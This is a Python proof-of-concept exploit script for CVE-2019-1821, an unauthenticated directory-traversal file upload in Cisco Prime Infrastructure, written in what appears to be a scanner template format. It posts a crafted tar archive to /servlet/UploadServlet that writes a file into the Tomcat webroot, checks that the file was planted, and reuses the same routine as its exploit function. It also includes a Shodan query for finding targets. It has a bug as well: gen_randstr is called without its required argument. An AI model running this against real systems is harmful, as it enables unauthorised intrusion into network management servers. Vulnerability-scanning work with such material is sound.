import requests
import random
import string


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Cisco Prime Infrastructure Unauthorized RCE''',
        "description": '''Cisco Prime Infrastructure Health Monitor HA TarArchive Directory Traversal Remote Code Execution Vulnerability.''',
        "severity": "critical",
        "references": [
            "https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html", 
            "https://nvd.nist.gov/vuln/detail/CVE-2019-1821"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2019-1821",
            "cwe-id": "CWE-20"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.title:"prime infrastructure"'''
        },
        "tags": ["cve", "cve2019", "rce", "fileupload", "unauth", "intrusive", "cisco"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr()
    try:
        url = format_url(url)

        path = """/servlet/UploadServlet"""
        method = "POST"
        data = """--871a4a346a547cf05cb83f57b9ebcb83
Content-Disposition: form-data; name="files"; filename="test.tar"

../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{randstr}
--871a4a346a547cf05cb83f57b9ebcb83--""".format(randstr=randstr)
        headers = {'Accept-Encoding': 'gzip, deflate', 'Primary-IP': '127.0.0.1', 'Filename': 'test.tar', 'Filesize': '10240', 'Compressed-Archive': 'false', 'Destination-Dir': 'tftpRoot', 'Filecount': '1', 'Content-Length': '269', 'Content-Type': 'multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/test.txt"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200 and randstr in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))